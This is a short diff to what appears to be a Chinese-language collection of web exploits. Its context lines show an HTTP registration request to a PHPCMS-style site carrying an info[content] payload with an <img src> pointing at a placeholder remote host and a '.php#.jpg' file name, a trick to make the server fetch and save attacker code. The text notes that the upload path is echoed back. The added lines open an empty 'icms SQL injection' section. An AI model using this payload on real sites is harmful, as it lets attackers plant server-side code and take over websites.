@@ -33,3 +33,11 @@ POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
 siteid=1&modelid=11&username=test452&password=test2123&email=test2154@163.com&info[content]=<img src=http://xx.xx.xx.xx/1.txt?.php#.jpg>&dosubmit=1&protocol=
 ```
 此时会回显上传的路径
+
+
+^
+## **icms**
+sql注入
+```
+
+```
